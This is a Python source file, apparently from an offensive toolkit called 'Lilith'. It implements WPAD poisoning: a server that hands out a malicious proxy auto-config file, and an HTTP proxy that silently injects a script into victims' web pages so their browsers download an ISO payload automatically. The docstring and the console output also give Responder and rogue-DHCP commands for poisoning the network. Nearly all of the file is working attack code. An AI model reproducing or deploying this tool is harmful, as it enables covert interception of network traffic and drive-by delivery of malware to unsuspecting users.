"""
Lilith — WPAD poisoning + injecting HTTP proxy

Serves a malicious PAC script that routes all target HTTP traffic through an
attacker-controlled proxy. The proxy injects an ISO blob download into every
HTML response — silently, on every page the target browses.

WPAD discovery chain (Windows):
  1. DHCP option 252 (wpad) → http://wpad/wpad.dat
  2. DNS query for 'wpad.<domain>' → attacker IP
  3. LLMNR/mDNS fallback → Responder can answer 'wpad' queries

Setup:
  - Run Responder in WPAD poisoning mode to answer wpad DNS/LLMNR/NBT-NS queries:
      python3 Responder.py -I eth0 --wpad
  - OR: poison DHCP option 252 via yersinia / DHCP starvation + rogue DHCP
  - Then start this script — it handles both the PAC server and the proxy

Architecture:
  Port 80  → PAC file server  (/wpad.dat  /proxy.pac)
  Port 8080 → HTTP proxy:
    - plain HTTP  → inject ISO download JS into HTML responses
    - CONNECT     → tunnel through to destination (HTTPS passthrough)

Injection:
  The proxy injects a small <script> tag before </body> in every text/html response.
  The script is the same ISO blob download used by HTML smuggling — one-liner that
  triggers the browser to download the ISO automatically, no user action required.

  On the first HTML page the target loads, the ISO starts downloading in the background.
  The user sees nothing unusual — the page renders normally.

Usage:
  lilith network wpad --iface eth0 --lhost 10.10.14.1 [--pac-port 80] [--proxy-port 8080]
"""

import io
import os
import re
import socket
import threading
import urllib.parse
import urllib.request
from http.server  import BaseHTTPRequestHandler, HTTPServer


_MAX_BODY  = 10 * 1024 * 1024   # 10MB cap on buffered responses
_INJECT_RE = re.compile(rb'(</body\s*>)', re.IGNORECASE)


def _pac_file(proxy_host: str, proxy_port: int) -> str:
    return (
        "function FindProxyForURL(url, host) {\n"
        '  if (url.substring(0,5) === "https") return "DIRECT";\n'
        f'  return "PROXY {proxy_host}:{proxy_port}";\n'
        "}\n"
    )


def _inject_script(inject_js: str) -> bytes:
    return (
        b'\n<script>' + inject_js.encode() + b'</script>\n'
    )


def _make_pac_handler(proxy_host: str, proxy_port: int):
    class _PacHandler(BaseHTTPRequestHandler):
        _proxy_h = proxy_host
        _proxy_p = proxy_port

        def log_message(self, fmt, *a):
            print(f"[wpad-pac] {self.address_string()} — {fmt % a}")

        def do_GET(self):
            path = urllib.parse.urlparse(self.path).path
            if path in ("/wpad.dat", "/proxy.pac", "/wpad"):
                body = _pac_file(self._proxy_h, self._proxy_p).encode()
                self.send_response(200)
                self.send_header("Content-Type", "application/x-ns-proxy-autoconfig")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
            else:
                self.send_response(404)
                self.send_header("Content-Length", "0")
                self.end_headers()

    return _PacHandler


def _make_proxy_handler(inject_js: str):
    """HTTP proxy handler that injects inject_js into every HTML response."""

    inject_snippet = _inject_script(inject_js)
    _injected_hosts: set = set()   # only inject once per host to reduce noise

    class _ProxyHandler(BaseHTTPRequestHandler):
        def log_message(self, fmt, *a):
            print(f"[wpad-proxy] {self.address_string()} — {fmt % a}")

        # ── CONNECT (HTTPS tunnel) ────────────────────────────────────────────
        def do_CONNECT(self):
            host_port = self.path
            try:
                host, port_s = host_port.rsplit(":", 1)
                port = int(port_s)
            except ValueError:
                self.send_error(400)
                return

            try:
                remote = socket.create_connection((host, port), timeout=15)
            except OSError as e:
                self.send_error(502, str(e))
                return

            self.send_response(200, "Connection Established")
            self.end_headers()

            # Bidirectional raw tunnel
            def _pipe(src, dst):
                try:
                    while True:
                        data = src.recv(65536)
                        if not data:
                            break
                        dst.sendall(data)
                except OSError:
                    pass
                finally:
                    try: dst.shutdown(socket.SHUT_WR)
                    except OSError: pass

            t1 = threading.Thread(target=_pipe, args=(self.connection, remote), daemon=True)
            t2 = threading.Thread(target=_pipe, args=(remote, self.connection), daemon=True)
            t1.start(); t2.start()
            t1.join(); t2.join()
            try: remote.close()
            except OSError: pass

        # ── Plain HTTP proxy ──────────────────────────────────────────────────
        def _proxy_request(self, method: str):
            url = self.path
            if not url.startswith("http"):
                self.send_error(400, "Relative URL on proxy")
                return

            parsed  = urllib.parse.urlparse(url)
            host    = parsed.netloc

            # Build forwarding request
            headers = {}
            for k, v in self.headers.items():
                lk = k.lower()
                if lk in ("proxy-connection", "connection", "keep-alive"):
                    continue
                headers[k] = v
            headers["Connection"] = "close"

            body = None
            if method in ("POST", "PUT", "PATCH"):
                cl = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(cl) if cl else None

            req = urllib.request.Request(url, data=body, headers=headers, method=method)
            try:
                resp = urllib.request.urlopen(req, timeout=15)
            except urllib.error.HTTPError as e:
                resp = e
            except Exception as e:
                self.send_error(502, str(e))
                return

            status      = resp.status
            raw_headers = resp.headers
            ct          = raw_headers.get("Content-Type", "")
            is_html     = "text/html" in ct

            # Read body (capped)
            try:
                resp_body = resp.read(_MAX_BODY)
            except Exception:
                resp_body = b""

            # Inject into HTML (once per host)
            if is_html and host not in _injected_hosts:
                _injected_hosts.add(host)
                if b'</body' in resp_body.lower():
                    resp_body = _INJECT_RE.sub(inject_snippet + rb'\1', resp_body, count=1)
                    print(f"[wpad-proxy] [INJECT] {host} — ISO download triggered")
                else:
                    resp_body += b'\n' + inject_snippet

            # Forward response
            self.send_response(status)
            skip_h = {"transfer-encoding", "content-encoding", "content-length", "connection"}
            for k, v in raw_headers.items():
                if k.lower() not in skip_h:
                    self.send_header(k, v)
            self.send_header("Content-Length", str(len(resp_body)))
            self.send_header("Connection", "close")
            self.end_headers()
            self.wfile.write(resp_body)

        def do_GET(self):     self._proxy_request("GET")
        def do_POST(self):    self._proxy_request("POST")
        def do_HEAD(self):    self._proxy_request("HEAD")
        def do_PUT(self):     self._proxy_request("PUT")
        def do_DELETE(self):  self._proxy_request("DELETE")
        def do_OPTIONS(self): self._proxy_request("OPTIONS")

    return _ProxyHandler


def run_wpad(
    lhost:      str,
    inject_js:  str,
    pac_port:   int = 80,
    proxy_port: int = 8080,
) -> None:
    print(f"[*] WPAD poisoning mode")
    print(f"    PAC server  : http://{lhost}:{pac_port}/wpad.dat")
    print(f"    Proxy       : {lhost}:{proxy_port}")
    print()
    print(f"[*] Responder WPAD poisoning (answer wpad DNS/LLMNR queries):")
    print(f"    python3 Responder.py -I eth0 --wpad -b -F")
    print(f"    # (Edit Responder.conf: set Force WPAD Auth = Off to avoid NTLM popup)")
    print()
    print(f"[*] Alternatively, poison DHCP option 252:")
    print(f"    option wpad code 252 = text;")
    print(f"    option wpad \"http://{lhost}:{pac_port}/wpad.dat\";")
    print()
    print(f"[*] Injection: ISO blob download injected into first HTML page per host")
    print(f"    HTTPS traffic is tunnelled through without modification")
    print(f"    Press Ctrl+C to stop.")
    print()

    pac_handler   = _make_pac_handler(lhost, proxy_port)
    proxy_handler = _make_proxy_handler(inject_js)

    pac_server   = HTTPServer(("0.0.0.0", pac_port),   pac_handler)
    proxy_server = HTTPServer(("0.0.0.0", proxy_port), proxy_handler)

    t_pac   = threading.Thread(target=pac_server.serve_forever,   daemon=True)
    t_proxy = threading.Thread(target=proxy_server.serve_forever, daemon=True)
    t_pac.start()
    t_proxy.start()

    print(f"[+] PAC server   listening on 0.0.0.0:{pac_port}")
    print(f"[+] HTTP proxy   listening on 0.0.0.0:{proxy_port}")
    print()

    try:
        t_pac.join()
        t_proxy.join()
    except KeyboardInterrupt:
        print("\n[*] WPAD servers stopped.")
    finally:
        pac_server.server_close()
        proxy_server.server_close()
